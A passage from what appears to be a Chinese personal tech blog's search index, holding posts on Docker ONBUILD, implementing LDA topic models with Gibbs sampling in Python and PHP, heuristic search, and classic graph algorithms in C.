/a/b/c。 ONBUILD ONBUILD [ INSTRUCTION ] 配置当所创建的镜像作为其它新创建镜像的基础镜像时，所执行的操作指令。 例如，Dockerfile 使用如下的内容创建了镜像 image-A。 [...] ONBUILD ADD . /app/src ONBUILD RUN /usr/local/bin/python-build --dir /app/src [...] 如果基于 image-A 创建新的镜像时，新的Dockerfile中使用 FROM image-A指定基础镜像时，会自动执行ONBUILD 指令内容，等价于在后面添加了两条指令。 FROM image-A #Automatically run the following ADD . /app/src RUN /usr/local/bin/python-build --dir /app/src 使用 ONBUILD 指令的镜像，推荐在标签中注明，例如 ruby:1.9-onbuild。 镜像的创建 镜像的创建会读取Dockerfile，使用 # docker build -t 镜像名 /.../Dockerfile 可以创建一个镜像了 参考 Dockfile 文件介绍]]></content>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LDA的实现]]></title>
    <url>%2F2016%2F05%2F01%2FLDA%E7%9A%84%E5%AE%9E%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[参考LDA数学八卦和GibbsLDA++实现的LDA模型，以及自己对这个模型的理解 LDA的Gibbs抽样 在上一篇文章中提到了Gibbs抽样的推导最终结果，根据这个推导公式可以在计算机上模拟文档集的生成过程。Gibbs抽样的推导结果如下： 实现思路： 1：先随机为每个单词赋予一个主题 2：根据抽样公式计算当前单词生成每个主题的概率 3：利用掷骰子算法生成下一个主题 4：一直迭代下去，最后计算文档——主题、主题——单词的概率分布 代码放在了Github - LDA上了 数据结构的设计 根据抽样公式公式可知，需要保存的东西有 1：每个主题对应单词的个数 2：每个单词对应某个主题的单词个数 3：每篇文章单词的个数 4：每篇文章的每个主题对应的单词总数 用Python定义的数据结构如下： 1234567891011121314151617181920212223242526272829303132# 单词到ID的映射表self.word_map = &#123;&#125;# ID到单词的映射self.id2word = []# 保存每篇文章的词数self.doc_word_num = []# 保存每篇文章self.doc = []# 保存每篇文章的每个单词对应的主题self.doc_word_topic = []# 保存每个主题的词数self.topic = []# 保存每篇文章的主题单词个数self.doc_topic = []# 这个词属于哪个主题self.word_id_topic = []# 文档--主题的概率分布self.theta = []# 主题--单词的概率分布self.phi = []# 样本中文档的个数self.M = 0# 样本中单词的个数self.V = 0# 样本中主题的个数self.K = 0# 文档——主题的Dirichlet分布参数self.alpha = 0# 主题——单词的Dirichlet分布参数self.beta = 0# 最大迭代次数self.max_iter = 0 抽样过程 初始化 首先解析样本文件，随机为每个单词指定一个主题 123456789101112131415161718192021"""随机为这些单词，赋值一个主题"""doc_id = 0while doc_id &lt; doc_num : document = self.doc[doc_id] word_num = self.doc_word_num[doc_id] word_index = 0 word_topic = [] while word_index &lt; word_num: random_topic = random.randint(0, self.K-1) word_id = self.word_map[document[word_index]] self.word_id_topic[word_id][random_topic] += 1 self.topic[random_topic] += 1 self.doc_topic[doc_id][random_topic] += 1 # 每个单词对应的主题 word_topic.append(random_topic) word_index += 1 # 每篇文章m的第n个单词对应的主题 doc_word_topic[m][n] = random_topic self.doc_word_topic.append(word_topic) doc_id += 1 掷骰子算法 利用上述的抽样公式计算当前单词生成每个主题对应概率数组，在借鉴了GibbsLDA++的实现如下 123456789101112131415161718192021222324def sampling( self, doc_id, word_index ): word_id = self.word_map[self.doc[doc_id][word_index]] topic = self.doc_word_topic[doc_id][word_index] self.doc_topic[doc_id][topic] -= 1 self.topic[topic] -= 1 self.word_id_topic[word_id][topic] -= 1 self.doc_word_num[doc_id] -= 1 vbeta = self.V * self.beta kalpha = self.K * self.alpha k = 0 pro = [] while k &lt; self.K: """ Gibbs Sampling 推导的抽样公式 """ probility = ( self.word_id_topic[word_id][k] + self.beta ) \ / ( self.topic[k] + vbeta ) \ * ( self.doc_topic[doc_id][k] + self.alpha ) \ / ( self.doc_word_num[doc_id] + kalpha ) pro.append(probility) k += 1 把对应生成每个主题的概率计算出来之后，在计算机中如何生成指定概率分布条件下的样本值呢？掷骰子算法（像极了轮盘赌算法）的做法如下： 123456789101112131415"""掷筛子算法"""k = 1while k &lt; self.K: pro[k] += pro[k-1] k += 1possible = random.random() * pro[self.K - 1]topic = 0while topic &lt; self.K: if pro[topic] &gt; possible : break topic += 1 文档——主题、主题——单词概率分布的计算 最后在再分别计算文档——主题、主题单词的概率分布 1234567891011121314151617181920212223242526def compute_theta( self ): doc_id = 0 while doc_id &lt; self.M: topic_index = 0 theta_pro = [] while topic_index &lt; self.K: temp_pro = ( self.doc_topic[doc_id][topic_index] + self.alpha ) / \ ( self.doc_word_num[doc_id] + self.K * self.alpha ) theta_pro.append(temp_pro) topic_index += 1 self.theta.append(theta_pro) doc_id += 1def compute_phi( self ): topic_index = 0 while topic_index &lt; self.K: word_id = 0 phi_pro = [] while word_id &lt; self.V: temp_pro = ( self.word_id_topic[word_id][topic_index] \ + self.beta ) / ( self.topic[topic_index] \ + self.V * self.beta ) phi_pro.append(temp_pro) word_id += 1 self.phi.append(phi_pro) topic_index += 1 LDA的推断过程 这里我是用PHP实现的，因为工程实践的服务器采用的编程语言是PHP。推断过程也是类似，不断这里需要辅助列表来保存新的样本集合，最终的目的还是计算新来的单词生成对应的每个主题的概率，然后利用掷骰子算法选择命中的主题。不断的迭代这个过程，使主题的分布趋于稳定。 1234567891011121314151617181920212223242526272829303132333435363738public function sampling( $index ) &#123; $topic = $this-&gt;new_doc_word_topic[$index]; $word = $this-&gt;new_doc[$index]; $word_id = -1; /* 在训练好的模型中没有发现此单词，返回-1 */ if( array_key_exists($word, $this-&gt;word2id) ) $word_id = $this-&gt;word2id[$word]; else return -1; $new_word_id = $this-&gt;new_word2id[$word]; $this-&gt;new_topic[$topic] -= 1; $this-&gt;new_word_id_topic[$new_word_id][$topic] -= 1; $this-&gt;word_num -= 1; $Vbeta = $this-&gt;V * $this-&gt;beta; $Kalpha = $this-&gt;K * $this-&gt;alpha; $probe = Array(); /* 借鉴GibbsLDA++的推断过程 */ for( $i = 0; $i &lt; $this-&gt;K; $i++ ) &#123; $p = ($this-&gt;word_id_topic[$word_id][$i] + $this-&gt;new_word_id_topic[$new_word_id][$i] + $this-&gt;beta); $p /= ($this-&gt;topic[$i] + $this-&gt;new_topic[$i] + $Vbeta); $p *= (($this-&gt;new_topic[$i] + $this-&gt;alpha) / ($this-&gt;word_num + $Kalpha)); $probe[$i] = $p; &#125; for( $i = 1; $i &lt; $this-&gt;K; $i++ ) &#123; $probe[$i] += $probe[$i-1]; &#125; $priot = ((float)rand() / getrandmax() ) * $probe[$this-&gt;K - 1]; for( $i = 0; $i &lt; $this-&gt;K; $i++ )&#123; if( $probe[$i] &gt; $priot ) break; &#125; $this-&gt;new_topic[$i] += 1; $this-&gt;new_word_id_topic[$new_word_id][$i] += 1; $this-&gt;word_num += 1; return $i; &#125; 这里需要注意的是：样本集很少的情况下，那么在训练好的模型中很可能无法找到新来的待推断的单词，我的做法就是直接返回-1，也就是忽略了这篇文章中的这个单词。。。 代码放在了Github - SearchEngine上了 思考和感悟 我之前的想法是： 计算每篇文章的主题分布，然后利用计算好的模型推断出用户输入集合的主题分布，根据主题分布的相似性来判断用户在查找哪篇文章。 但实际编码出来之后的效果很不好， 一方面由于文档集中太多无关紧要的单词参与到整个抽样过程，可选的方法有只选文档中的名词或者形容词进行抽样。 一方面可能由于文档集规模很小的缘故，掷骰子算法还是不可避免的产生抖动，也就是说它不能像马尔科夫链那样最终收敛。 还有一方面主题分布之间的相似性度量我选择的是欧式距离，这样的度量在美食文章领域是否准确呢？]]></content>
      <tags>
        <tag>机器学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Latent Dirichlet Allocation]]></title>
    <url>%2F2016%2F04%2F16%2FLatent-Dirichlet-Allocation%2F</url>
    <content type="text"><![CDATA[LDA在机器学习领域是一个应用很广泛的主题模型，这几天一直在学习这个模型，现在很勉强的对这个模型有了整体的把握，并且用Python简要的实现了一下，打算把自己对LDA的理解暂且记录一下，以后继续完善~ 主题模型 LDA是一个主题模型，关于主题模型的解释有个很通俗的例子： 第一个是：“乔布斯离我们而去了。” 第二个是：“苹果价格会不会降？” 我们一眼就可以看出这两句是有关联的，第一句里面有了“乔布斯”，我们会很自然的把“苹果”理解为苹果公司的产品，它们属于了同一个主题：苹果公司。 而像我之前那种计算关联度的时候，即文档之间重复的词语越多越可能相似，是无法达到这个效果的。文档之间重复的词语越多越可能相似，这一点在实际中并不尽然。很多时候相关程度取决于背后的语义联系——主题描述，而非表面的词语重复。 LDA的与上述方法不同之处在于：上述方法直接处理单词与文章的关系，而LDA过程在单词与文章之间加了一层主题，即文档——主题，主题——单词的路径计算。 LDA的概要 很多关于介绍LDA的文章大多以学术、理科学生的思维出发的，即用数学公式的严谨性来推导整个LDA的过程。我看了好久才理清了这个流程，因为它涉及到的数学推导很多，很容易陷入公式推导的怪圈里，无法对整个LDA的思想有个整体把握。。。 JULY博主说LDA分为五个部分： 一个函数：gamma函数 四个分布：二项分布、多项分布、beta分布、Dirichlet分布 一个概念和一个理念：共轭先验和贝叶斯框架 两个模型：pLSA、LDA 一个采样：Gibbs采样 确实如此，如果要想完整的理清这个来龙去脉，上面五个部分是不可少的。现在我尝试逆推这个过程，即以工科生的思维来阐述，为什么LDA需要上述5个部分，即从Gibbs采样开始说起。 伟大的统计模拟 LDA模型的需求是什么呢？即得到文档——主题的概率分布，主题——单词的概率分步，这要怎么做呢？很直观的做法就是： 文档——主题：计算文档中属于Ki主题的单词数 / 文档单词总数 主题——单词：计算单词Wi属于Kj主题的单词数 / 属于Kj主题的单词总数 可问题是，对于一个文档集我们是很难知道每个单词对应的哪个主题的，那么上面的公式就无法计算，那这个问题如何解决呢？？这就要借助统计模拟过程了。 《LDA数学八卦》中把文章的创作过程形象的解释成上帝掷骰子的游戏，并在书中形象的阐述了几种模拟过程：Unigram Model，加上贝叶斯的Unigram Model，PLSA，加上贝叶斯的PLSA。下面我主要阐述一下这几个过程： Unigram Model 最简单的Unigram Model认为上帝以下面这个规则来创作一篇文章： 1：上帝只有一个骰子，骰子有V个面，每个面代表一个单词，各个面的概率不一。 2：每抛一次骰子，抛出的面就对应这个单词。那么如果一篇文章有n个单词，那这篇文章就是上帝独立的抛了n次骰子的结果。 骰子各个面出现的概率定义为 P(p1, p2, p3, … , pv )，那么一篇文档 D(w1, w2, w3, … , wn ) 生成的概率就是 而文档与文档之间我们认为是独立的，所以如果有多篇文档 W(w1, w2, … , wm) 那么这个文档集的概率为： 假设文档集中单词总数为 N，我们关注每个单词 vi 的发生次数 ni，那么 n( n1, n2, … , nv )是一个多项式分布 我们的任务就是通过这个模拟过程得到文档中单词的概率分布，也就是骰子每个面的概率是多大，那么可以通过最大似然使概率最大化，于是参数 pi 的值为 经过模拟过程，我们可以得到文档–单词的概率分步，即P(p1, p2, … , pv)。 关于最大似然的理解 假设有一个黑盒子，里面装满了五颜六色的小球。我们从这个盒子中随机的取出一个球记下颜色后，再放回盒子，重复这个动作100次。最后统计我们取出红色的个数，假如是80个，那么我们比较有把握确定黑盒子中红球的比例是80%左右，这个就是最大似然的概念。 加上贝叶斯的Unigram Model 贝叶斯学派认为上帝只有一个骰子是不合理的，他们认为上帝有无穷多的骰子，上帝以下面的规则创作一篇文章： 1：上帝有一个大坛子，里面装着很多骰子，每个骰子有V个面 2：上帝先从坛子里取出一个骰子，然后不断的抛，骰子抛出的结果就是创作了一篇文章 这与Unigram Model不同之处在于，上帝有很多骰子，这些骰子符合一个概率分布。那么在贝叶斯框架下，有如下关系： 1先验概率 * 似然函数 = 后验概率 那么这里的骰子的先验概率如何选择呢？因为这个问题实际上是计算一个多项分布的概率，而Dirichlet分布恰好是多项分布的共轭分布。这里我们把骰子的先验概率看成Dirichlet分布。那么现在的贝叶斯框架就变成了 1Dirichlet分布 * 多项分布的数据 = 后验分布为Dirichlet分布 在给定参数 p 的先验分布 Dir(p | a)的时候，各个词出现的概率为多项分布 n ~ Mult(n | p, N)，我们能很轻易的求出它的后验分布为 Dir( p | a+n ) 我们最主要的任务是估计筛子 V 个面的概率分布，由于我们有了参数的后验分布，所以合理的方式是使用后验分布的极大值点，或者参数在后验分布的平均值，在这里我们取平均值计算得到： PLSA模型 前面2个都是铺垫，现在终于涉及到主题模型的统计模拟了。在PLSA(Probabilistic Latent Semantic Analysis)中，认为上帝是这么创作一篇文章的： 1：上帝有2种骰子，一种是doc-topic类型骰子，它有K个面，每个面对应一个文章主题。一种是topic-word骰子，总共K个，有V个面，每个面对应一个单词 2：上帝先抛doc-topic骰子得到一个主题编号Ki，然后选择第Ki个topic-word骰子进行抛掷，得到一个单词 3：假设这篇文章有n个单词，就重复上个过程n次 加上贝叶斯的PLSA 同Unigram Model类似，贝叶斯学派认为上帝的doc-topic和topic-word骰子要有先验概率分布的，即加上这2个Dirichlet先验概率分布最后成了我们的LDA模型。现在文章的创作过程变成了： 1：先随机抽取K个topic-word骰子，编号 1 到 K 2：在生成一篇新的文章时，先随机选择一个doc-topic骰子，再重复下面一个过程生成文章中的所有单词 3：投掷doc-topic骰子，得到主题编号 z，然后选择编号为 z 的topic-word骰子投掷，生成一个单词 那么文档到主题，主题到单词的概率分布如何计算呢？同加上先验的贝叶斯Unigram Model类似，文章——主题的概率计算如下： 主题——单词的概率计算如下： Nm表示第m篇文章的单词数，Nk表示第k个topic的单词数，Z向量表示主题分布，W向量表示主题——单词的分布。 注: 这里我省去了很多公式推导过程，大部分的推导，我自己还没看懂。。 公式里的alpha 和 beta被称为超参数，它们是Dirichlet分布中的参数。它们的作用解释如下： alpha变小，是尽可能让同一个文档只有一个主题，beta变小，是让一个词尽可能属于同一个主题。 Gibbs sampling 现在整个模拟过程大致了解了，那么怎么让计算机来执行这个过程呢？Gibbs采样就是做这个过程的，但在正式叙述Gibbs采样之前，还得再加一个前戏，就是MCMC(Markov Chain Monte Carlo)。 马氏链 马氏链的数学定义比较简单 状态转移的概率只依赖前一个状态的概率。 它有一个很重要的性质：如果转移矩阵满足细致平稳条件的话，那么马氏链会最终收敛。它收敛的概率分布只依赖转移概率矩阵，与初始分布无关，这就很适合于给定概率分布的情况下，生成对应的样本。 注： 细致平稳条件：浅显的说，从状态A(x1, y1)转移到状态B(x1, y2)的概率 = 状态B(x1, y2)转移到状态A(x1, y1)的概率，如下所示： 改造马氏链：MCMC 对于给定的概率分布p(x),我们希望能有便捷的方式生成它对应的样本。由于马氏链能收敛到平稳分布， 于是一个很的漂亮想法是：如果我们能构造一个转移矩阵为P的马氏链，使得该马氏链的平稳分布恰好是p(x), 那么我们从任何一个初始状态x0出发沿着马氏链转移, 得到一个转移序列 x0,x1,x2,⋯xn,xn+1⋯,， 如果马氏链在第n步已经收敛了，于是我们就得到了 π(x) 的样本xn,xn+1⋯。 因为马氏链只有满足细致平稳的条件下，才会收敛，才能达到生成给定概率分布而对应的样本。在MCMC方法中，引入一个变量接受率alpha： 对于alpha怎样取值，才能使上面式子相等呢？最简单的，按照对称性，可以这样取值： 于是这样就可以满足细致平稳条件了 于是我们把原来具有转移矩阵Q的一个很普通的马氏链，改造为了具有转移矩阵Q′的马氏链，而 Q′恰好满足细致平稳条件，由此马氏链Q′的平稳分布就是p(x)！ 由于接受率alpha有时候值太小，造成拒绝跳转，也就说很难收敛。这时候把**alpha(i,j)和alpha(j,i)**同比例放大，直到有一方达到1。对MCMC算法的接受率进行微小的改造，就得到了最常见的 Metropolis-Hastings 算法。 Gibbs抽样 Gibbs抽样跟MCMC过程很相似，不同之处在于：上述在放大alpha接受率的时候，可能很耗时。而Gibbs抽样可以很方便的做到使接受率达到1，即仅进行一维方向上的转移。例如有一个概率分布 p(x, y)，考察 x 坐标相同的两点 A(x1, y1) B(x1, y2) 即 说明沿着坐标轴 x 的转移符合细致平稳条件，注意此时我们没有施加接受率这个参数，对于沿着坐标轴 y 轴情况也满足细致平稳条件。 那么Gibbs抽样在采样过程中，就会轮换着沿着x轴或者y轴进行转移。 文档中应用Gibbs抽样算法 由上述过程可以了解到，我们在知道文档的先验概率分布（Dirichlet分布）的情况下，Gibbs抽样是可以模拟文档生成的过程的。LDA的Gibbs抽样的公式推导的最终结果如下： 其算法如下： 1：因为马氏链的平稳状态与初始分布无关，这时候我们可以随机为每个单词 w 指定一个主题 z 2：重新扫描文档集，对每个单词以Gibbs sampling公式重新采样它的topic 3：重复上述过程，直到收敛为止 4：统计文档集中，doc-topic和topic-word的概率 小结 在学习LDA初期，我一直很疑惑这个模型输入的主题参数是什么？？其实就是一个文档集大致所包含的主题数目，超参数alpha和beta决定了文档——主题和主题——单词的先验概率，其规律大致如下： 1alpha变小，是尽可能让同一个文档只有一个主题，beta变小，是让一个词尽可能属于同一个主题。 关于如何选择主题的个数以及超参数的设定，目前仍在学习过程中。。。 在JULY所说的五个过程还有gamma函数、二项分布、beta分布没有涉及，因为前面在提到先验概率时的多项分布，是从二项分布演化来的，这里我直接跳过去了。。而beta分布是二项分布的共轭分布，beta分布和二项分布的关系，与Dirichlet分布和多项分布的关系相似。 gamma函数是描述一个数的阶乘表示形式 它可以用来计算非整数的阶乘，因为二项分布、beta分布、多项分布、Dirichlet分布中，它们的概率计算公式可以使用gamma函数表示，在Gibbs sampling公式的推导过程中，把gamma消去了。所以为了整体把握LDA流程，这里我没有叙述这些知识 下一部分我决定写下我的LDA模型实现过程，以及模型的主题个数选择原则和模型的评价指标。 参考 [1] 《LDA数学八卦》 [2] CSDN JULY_通俗理解LDA [3] 博客园 Entropy_主题模型解释 [4] 博客园 ywl925_MCMC随机模拟]]></content>
      <tags>
        <tag>机器学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[启发式搜索]]></title>
    <url>%2F2016%2F03%2F28%2F%E5%90%AF%E5%8F%91%E5%BC%8F%E6%90%9C%E7%B4%A2%2F</url>
    <content type="text"><![CDATA[最近为了解决一个问题，粗略的学习了一些搜索算法，我真正动手实现的只有里面的2种，忽然感觉饶了一大圈又跑到机器学习的领域上去了。。。 写在前面 为了解决一个关于查找最短路径的问题，我查找了很多资料，学习到了一些新的算法。这篇文章我打算叙述两个部分，一个关于局部最优问题，一个关于启发式搜索问题。 问题的引入 这个问题来源于某公司的一个挑战赛中，是一个NP-hard问题，类似于旅行商问题和邮递员问题。其主要解决的问题就是在指定拓扑图G(V, E)中，找到一条尽量最优的路径，且这条路径不存在回路，且经过指定顶点集。 最短路径问题 想到最短路径问题，立马想到了Dijkstra算法了。。。这是一个非常高效的算法，它是基于贪心的算法思想。但上述题目并不具有贪心选择性质，会陷入局部最优。好的的情况下，会生成一条不是最优的路径；但差的情况下，甚至找不到一条有效路径。。 局部最优的情况 我第一次接触局部最优问题是在机器学习中的，比如逻辑回归在训练的过程中，采用梯度下降法对一些参数的优化的时候，会产生一些局部最优解。这是因为它的损失函数不是凸函数的缘故，因为这个函数有多个极值嘛。 在这个问题中，直接使用Dijkstra算法也会陷入局部最优的情况，如何跳出这个局部最优呢？比较典型的算法，哦不对应该是算法思想吧，模拟退火。这一题我之前就是用这个算法求解的，但效果不太理想。模拟退火算法属于一种启发式的搜素算法。 启发式的搜索 启发式搜索算是一种思想吧，就像动态规划一样，它是一种算法思想。它采用某些反馈措施，影响下一次选择的可能，而不是仅仅着眼于当下。其中我知道的有A*寻路算法、蚁群算法、遗传算法、模拟退火算法，还有最近很火的蒙特卡洛算法。我自己动手实现的就退火还有蚁群算法，它们的思想都很相似，我感悟最深的一句话，来自于百度百科关于蚁群算法的介绍中。 大自然的进化，社会的进步、人类的创新实际上都离不开这两样东西，多样性保证了系统的创新能力，正反馈保证了优良特性能够得到强化，两者要恰到好处的结合。 蚁群算法、遗传、蒙特卡洛算法的思想非常类似于上面两句话。我对启发式的理解也与它类似，就是随机性加上正负反馈。后面我的算法就是根据这句改进的，但目前陷入参数待优化的尴尬情况。。。从3月初到现在，我已经换过2次数据结构，三次算法了。。真是醉了。。总得来说，受益匪浅吧。一路学习的过程中，虽然没有真正掌握几个算法，但多了几种解决问题的思路，还是可以的~ 吐槽一下 我看到有些同学开始采用开源的算法引擎库了，不知道效果咋样？？找了好多论文都没来得及看，群里面有大神提出一种新的思路求解这道题目，用线性规划的思想找到这个最优解。感觉好牛X的样子，但我完全没思路，怎么破？只能老实的优化自己的代码，然后尝试学习下线性规划方面的知识。还有十几天就要结束了，希望自己能坚持到最后，加油啊 _ 忽然感觉一个人的战斗好累啊。。。]]></content>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[图的常用算法]]></title>
    <url>%2F2016%2F03%2F07%2F%E5%9B%BE%E7%9A%84%E5%B8%B8%E7%94%A8%E7%AE%97%E6%B3%95%2F</url>
    <content type="text"><![CDATA[纸上得来终觉浅，绝知此事要躬行。打算把图的常用算法梳理一遍，加深一下记忆和理解。 简介 前面写了一遍关于图的存储结构和遍历算法的文章，这一篇打算回顾一下图的一些常用算法，包括最小生成树、最短路径算法。这些算法很基础，在生活中经常用到，打算自己动手实现一下，加深理解~~ 最小生成树 **生成树的概念：**r若图是连通的无向图或强连通的有向图，则从任何一个顶点出发调用一次BFS或者DFS便可访问图中所有的顶点，这种情况下，图中所有顶点加上遍历过程中经历的边构成的子图成为原图的生成树。对于不连通和不是强连通的有向图，这样得到的是生成森林。 最小生成树：对于加权图，权值最小的生成树成为最小生成树。可以用kruskal（克鲁斯卡尔）算法或prim（普里姆）算法求出，这两种算法依据的思想是贪心思想。 prim（普利姆）算法 第一步：选择一个初始顶点V1，设置一个访问数组visit[]和最小距离数组distance[]。最小距离数组保存当前已访问顶点的生成树中到每个顶点最小的距离。 第二步：根据初始顶点V1，初始化visit和distance数组。 第三步：选择distance中权重最小的那个顶点，以此顶点为起始点更新distance数组，直至所有顶点都已访问。 未优化的prim算法时间复杂度为O(N^2)，其C语言描述如下，： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455/* 输入分别为：邻接链表、保存生成树遍历的数组、最小的权重 */int prim( GraphAdjList * G, int tree[], int * weight )&#123; if( G == NULL ) return 0; int num_vertex = G-&gt;numVertex; int index = 0; int next_visit = 0; // 下一个要选择的顶点 int visit[num_vertex] = &#123;0&#125;; int distance[num_vertex] = &#123;MAX_INT&#125;; int first_node = 0; EdgeNode * edge = G-&gt;adjList[first_node]-&gt;firstEdge; /* 初始化距离数组 */ while( edge ) &#123; /* 当前访问节点的下标 */ int vertex_index = edge-&gt;adjvex; distance[vertex_index] = edge-&gt;weight; edge = edge-&gt;next; &#125; visit[first_node] = 1; tree[index++] = first_node; for( int i = 1; i &lt; num_vertex; i++ ) &#123; int min_weight = MAX_INT; /* 从距离数组中找出最小距离的顶点 */ for( int j = 0; j &lt; num_vertex; j++ ) &#123; if( visit[j] == 0 &amp;&amp; distance[j] &lt; min_weight ) &#123; min_weight = distance[j]; next_visit = j; &#125; &#125; visit[next_visit] = 1; tree[index++] = next_visit; *weight += min_weight; /* 新加入节点之后，更新距离数组 */ EdgeNode * edge = G-&gt;adjList[next_visit]-&gt;firstEdge; while( edge ) &#123; /* 当前访问节点的下标 */ int vertex_index = edge-&gt;adjvex; if( visit[vextex_index] == 0 &amp;&amp; edge-&gt;weight &lt; distance[vertex_index] ) &#123; distance[vertex_index] = edge-&gt;weight; &#125; edge = edge-&gt;next; &#125; &#125; return 1;&#125; kruskal（克鲁斯卡尔）算法 kruskal算法需要判断是否存在回路问题，判断是否存在回路问题方法很多，下面列出两种比较简单的方法。 如何判断存在回路 第一种方法 1、将度数小于2的顶点删去，并将与其相连的顶点度数减1。若是有向图则删除入读为0的顶点，并将与该点相连的顶点入读减1。 2、重复上述过程，若只剩下顶点，则存在回路，否则不存在。 第二种方法 1、将未遍历的节点涂成白色，已遍历的节点涂成灰色，若该节点的所有相邻边都被遍历了，则涂成黑色。 2、若遍历时，有一个节点的一条未遍历的边指向一个灰色节点，则存在回路。 实现过程 因为这个算法对稀疏图来说效率比较高，它的时间复杂度为O(ElogE)。所以这里我采用保存边集的数据结构实现kruskal算法。回路的判断方法是借鉴数据结构书上的，即对每一条边，进行编号，如果待加入的边不属于同一集合编号内，即可加入，如下图所示： A B C D E F 初始化分别在一个边集，编号分别为 0 1 2 3 4 5 此时 A B C 节点构成一个边集，其编号都设为0. D E 节点构成一个边集，其编号设为4 A B C F 节点构成一个边集，其编号设为0 A B C D E F 节点构成一个边集，其编号设为0 其C语言描述如下： 123456789101112131415161718192021222324252627282930313233343536373839404142typedef struct Edge&#123; int begin; int end; int weight;&#125; Edge[EDGE_NUM];/* 边的数目为EDGE_NUM，顶点的数目为VERTEX_NUM */int kruskal( Edge edge[], Edge tree[], int * weight )&#123; int edge_set[NUM]; // 保存边的编号 int index = 0 ; sort( edge ); // 按权重对边集排序 /* 初始化边集数组，把每个顶点单独放在一个编号里 */ for( int i = 0; i &lt; VERTEX_NUM; i++ ) &#123; edge_set[i] = i; &#125; for( int j = 0; j &lt; EDGE_NUM; j++ ) &#123; /* 选出第j小的边，所在的顶点 */ int begin = edge[j].begin; int end = edge[j].end; /* 找到这两个顶点所在边集的编号 */ int edge_num1 = edge_set[begin]; int edge_num2 = edge_set[end]; if( edge_num1 != edge_num2 ) &#123; /* 如果这两个顶点不在同一个边集上，则把这条边加入到生成树tree数组中 */ tree[index++] = edge[j]; for( int k = 0; k &lt; NUM; k++ ) &#123; /* 将这两个顶点边集合并成一个边集，遍历所有这条边集的顶点，使其都属于同一个边集 */ if( edge_set[k] == edge_num2 ) &#123; edge_set[k] = edge_num1; &#125; &#125; &#125; &#125;&#125; 最短路径 本科学过的最短路径问题，但当时仅限于概念上的理解，并没有实际动手实现过。这里我决定使用Dijkstra算法和Floyd算法，实现最短路径问题。Dijkstra算法时间复杂度要低于Floyd算法，但Dijkstra不能处理负权的情况？？ Dijkstra算法 这个算法跟prim算法很相似，都是依据贪心算法的思想，不同点在于prim算法保存的距离数组，是整个生成树到每个顶点的距离，而Dijkstra算法保存起点到每个顶点的最短距离。但过程和prim算法类似，步骤如下： 第一步：选择一个起始点，初始化距离数组distance和访问数组visit数组。 第二步：从距离数组中选择距离最小的顶点，并更新distance数组。 第三步：重复第二步，直到所有的顶点都已被访问。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556/* 输入分别为：邻接链表、保存遍历经过的顶点、最小的路径长度 */int dijkstra( GraphAdjList * G, int tree[], int * length )&#123; if( G == NULL ) return 0; int num_vertex = G-&gt;numVertex; int index = 0; int next_visit = 0; // 下一个要选择的顶点 int visit[num_vertex] = &#123;0&#125;; int distance[num_vertex] = &#123;MAX_INT&#125;; int first_node = 0; EdgeNode * edge = G-&gt;adjList[first_node]-&gt;firstEdge; /* 初始化距离数组 */ while( edge ) &#123; /* 当前访问节点的下标 */ int vertex_index = edge-&gt;adjvex; distance[vertex_index] = edge-&gt;weight; edge = edge-&gt;next; &#125; visit[first_node] = 1; tree[index++] = first_node; for( int i = 1; i &lt; num_vertex; i++ ) &#123; int min_weight = MAX_INT; /* 从距离数组中找出最小距离的顶点 */ for( int j = 0; j &lt; num_vertex; j++ ) &#123; if( visit[j] == 0 &amp;&amp; distance[j] &lt; min_weight ) &#123; min_weight = distance[j]; next_visit = j; &#125; &#125; visit[next_visit] = 1; tree[index++] = next_visit; *weight += min_weight; /* 新加入节点之后，更新距离数组 */ EdgeNode * edge = G-&gt;adjList[next_visit]-&gt;firstEdge; while( edge ) &#123; /* 当前访问节点的下标 */ int vertex_index = edge-&gt;adjvex; /* 与prim算法的不同之处 */ if( visit[vextex_index] == 0 &amp;&amp; edge-&gt;weight + distance[next_visit] &lt; distance[vertex_index] ) &#123; distance[vertex_index] = edge-&gt;weight + distance[next_visit]; &#125; edge = edge-&gt;next; &#125; &#125; return 1;&#125; Floyd算法 Floyd算法是用动态规划思想求解的，它可以求出每一对顶点之间的距离，时间复杂度为O(N^3)。动态规划很重要的一步就是找到该问题的最优子结构。在最短路径中，可以看出从** A 到 B 的最短距离，要么是 A B **直接相连的距离，要么经过一个中间节点。其最优子结构可以定义如下： dist( i, j ) = min( weight( i, j ), weight( i, k ) + weight( k , j ) ) { i &lt; k &lt; j } 其算法过程描述如下： 第一步：初始化每两顶点之间的距离 第二步：对每一对顶点查看是否有一个顶点** k 使得从 i 到 j**之间的距离变得更短，如果存在就更新这个距离值。 这一题用邻接表做比较麻烦，因为需要找到一个顶点 k 既与 i 节点相连，又与 j 节点相连，那就得同时遍历 i 和 j 的邻接点。这一题采用邻接矩阵解出的，其C语言描述如下： 12345678910111213141516171819202122232425262728/* path[i][j]表示 i 到 j 的最短距离 */int floyd( MGraph * G, int path[][VERTEX_NUM] )&#123; int num_vertex = G-&gt;numVertex; /* 初始化path数组 */ for( int i = 0; i &lt; num_vertex; i++ ) &#123; for( int j = 0; j &lt; num_vertex; j++ ) &#123; path[i][j] = G-&gt;edge[i][j]; &#125; &#125; for( int k = 0; k &lt; num_vertex; k++ ) &#123; for( int i = 0; i &lt; num_vertex; i++ ) &#123; for( int j = 0; j &lt; num_vertex; j++ ) &#123; /* 遍历找到是否有一个中间节点，使 i 和 j 之间的距离更小 */ if( ( path[i][k] + path[k][j] ) &lt; path[i][j] ) &#123; path[i][j] = path[i][k] + path[k][j]; &#125; &#125; &#125; &#125;&#125; 总结 理论和实践总是有一段距离的，自己动手写了一下，感觉自己多这两种算法的理解更深了。就像《程序员修炼之道》里说的那样，要做一个注重实践的程序员。在实现上述算法的过程中，借鉴了不少博主的文章，忽然间发现，有时候写文章不仅仅是为了自己，因为你写的文章有一天或许会帮助到其他人也说不定啊哈哈哈 参考 [1] 博客园 Veegin [2] 博客园 华山大师兄 EOF]]></content>
      <tags>
        <tag>算法</tag>
        <tag>图</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[朴素贝叶斯分类器]]></title>
